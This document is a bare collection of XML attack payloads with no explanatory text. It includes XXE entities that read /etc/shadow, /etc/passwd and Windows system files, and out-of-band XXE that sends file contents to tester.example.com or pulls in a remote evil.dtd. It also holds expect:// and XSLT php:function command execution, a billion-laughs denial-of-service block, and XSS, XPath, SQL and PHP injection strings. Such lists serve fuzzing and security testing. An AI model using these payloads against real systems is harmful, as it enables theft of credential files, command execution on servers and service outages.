```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
```

```xml
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///c:/windows/win.ini"> ]>

<!DOCTYPE replace [<!ENTITY ent SYSTEM "php://filter/convert.base64-encode/resource=file:///var/www/html/xxe/aaa.php">]>
```

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
<tag>&lol9;</tag>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ENTITY % pe SYSTEM "http://tester.example.com/xxe_file">
%pe;
%param1;
]>
<foo>&external;</foo>

The contents of xxe_file should be:
<!ENTITY % payload SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://tester.example.com/log_xxe?data=%payload;'>">
```

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE name [
<!ENTITY lol SYSTEM "expect://id">
<name>&lol;</name>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
<?xml version="1.0" encoding="ISO-8859-1"?><test></test>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com:80" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example:443" >]>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
<foo><![CDATA[' or 1=1 or ''=']]></foo>
<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<xml SRC="xsstest.xml" ID=I></xml>
<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><script>alert(123)</script></xsl:template></xsl:stylesheet>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:copy-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function('passthru','ls -la')"/></xsl:template></xsl:stylesheet>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com/text.txt" >]>
<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]>
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  "> %int;
<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://127.0.0.1:21/%data3;'>">
<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///etc/issue"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///c:/boot.ini"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
count(/child::node())
x' or name()='username' or 'x'='y
<name>','')); phpinfo(); exit;/*</name>
<!ENTITY xxe SYSTEM "file:///dev/random" >]><test>&xxe;</test>
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><test>&xxe;</test>
<!DOCTYPE foo [<!ENTITY xxefca0a SYSTEM "file:///etc/passwd"> ]>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>
```